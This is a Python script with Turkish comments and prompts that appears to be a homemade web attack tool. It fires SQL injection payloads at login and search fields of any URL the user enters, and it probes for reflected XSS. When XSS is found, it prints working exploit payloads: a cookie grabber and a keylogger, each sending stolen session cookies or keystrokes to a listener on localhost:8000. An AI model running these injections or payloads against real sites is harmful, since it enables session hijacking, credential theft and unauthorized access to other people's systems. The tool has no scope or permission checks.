import requests
import time

def scanner_v6(target_url, mode="ALL"):
    print(f"\n{'='*70}")
    print(f"[*] WEB VULNERABILITY SCANNER v6.0 (SQLi + XSS + PAYLOAD GEN)")
    print(f"[*] Hedef: {target_url}")
    print(f"[*] Mod: {mode}")
    print(f"{'='*70}\n")

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }
    
    # Hedef Inputlar (Genişletilebilir)
    input_fields = ['uname', 'pass', 'user_login', 'user_pass', 'search', 'q', 'query', 'id', 'cat']

    # --- 1. MODÜL: SQL INJECTION (Stealth) ---
    if mode == "ALL" or mode == "SQL":
        print("[*] SQL Injection Taraması Başlatılıyor...")
        # Güvenli ve etkili payloadlar
        sql_payloads = ["' OR '1'='1", '" OR "1"="1', "admin' --", "' OR 1=1 --", "' UNION SELECT 1,version()--"]
        
        with requests.Session() as s:
            for payload in sql_payloads:
                for field in input_fields:
                    data = {f: payload if f == field else "test" for f in input_fields}
                    try:
                        response = s.post(target_url, data=data, headers=headers, timeout=10)
                        errors = ["SQL syntax", "mysql_fetch", "MariaDB", "Welcome", "logout", "Logout", "user info"]
                        for err in errors:
                            if err in response.text:
                                print(f"\n[!!!] SQLi BULUNDU! ({err})")
                                print(f"      Payload: {payload}")
                                print(f"      Alan: {field}")
                                return # İlk bulduğunda dur
                    except: pass
        print("[-] SQL Taraması Bitti.\n")

    # --- 2. MODÜL: XSS ve EXPLOIT GENERATOR ---
    if mode == "ALL" or mode == "XSS":
        print("[*] XSS (Reflected) Taraması Başlatılıyor...")
        
        probe_payload = "<script>alert('XSS_TEST')</script>"

        with requests.Session() as s:
            for field in input_fields:
                data = {f: probe_payload if f == field else "test" for f in input_fields}
                try:
                    if "?" in target_url:
                        response = s.get(target_url + probe_payload, headers=headers, timeout=5)
                    else:
                        response = s.post(target_url, data=data, headers=headers, timeout=5)
                    
                    if probe_payload in response.text:
                        print(f"\n[!!!] XSS ZAFİYETİ BULUNDU!")
                        print(f"      Alan/Parametre: {field}")
                        
                        # --- EXPLOIT GENERATOR ---
                        print(f"\n{'='*20} SALDIRI SENARYOLARI (Payload Generator) {'='*20}")
                        print("Aşağıdaki kodları tarayıcıda kullanarak verileri 'listener.py'ye gönderebilirsin:\n")

                        print(f"[1] COOKIE GRABBER (Oturum Çalma):")
                        print(f"    <script>new Image().src='http://localhost:8000/cal?c='+document.cookie;</script>\n")

                        print(f"[2] KEYLOGGER (Tuş Kaydedici):")
                        print(f"    <script>document.onkeypress=function(e){{new Image().src='http://localhost:8000/log?k='+e.key;}}</script>\n")
                        
                        print(f"{'='*70}")
                        return 
                except: pass
        print("[-] XSS Taraması Bitti.")

if __name__ == "__main__":
    target = input("Hedef URL (Örn: http://testphp.vulnweb.com/search.php?test=query): ").strip()
    
    print("\nMod Seçin: \n1- Sadece SQLi\n2- Sadece XSS\n3- Hepsi (Varsayılan)")
    choice = input("Seçim: ").strip()

    if choice == "1": mode = "SQL"
    elif choice == "2": mode = "XSS"
    else: mode = "ALL"

    if target:
        scanner_v6(target, mode)
    
    input("\nÇıkmak için Enter...")
